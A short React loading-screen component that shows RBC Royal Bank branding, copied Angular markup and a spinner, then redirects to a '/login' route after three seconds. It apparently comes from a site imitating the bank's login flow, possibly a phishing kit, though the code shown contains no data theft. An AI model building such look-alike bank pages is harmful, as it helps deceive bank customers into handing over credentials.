import { useEffect } from "react";
import { useHistory } from "react-router";
import "./loading.css";

function Loading() {
  const history = useHistory();
  useEffect(() => {
    if (/Android|webOS|iPhone|iPad|Mac|Macintosh|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {

      setTimeout(() => {
        history.push("/login");
      }, 3000);
    } else {
      setTimeout(() => {
        history.push("/login");
      }, 3000);

    }

  }, []);




  return (
    <div _ngcontent-stu-c17="" class="di">
      <img alt="logo"
        _ngcontent-stu-c17=""
        src="./logo_rbc-royalbank-white-en.svg"
        class="logo"
      />
      <br _ngcontent-stu-c17="" />
      <img alt="eclip" _ngcontent-stu-c17="" src="./Eclipse-1s-200px (4).gif" class="zab" />
      <br _ngcontent-stu-c17="" />
      <h1 _ngcontent-stu-c17="">Loading...</h1>
    </div>
  );
}

export default Loading;
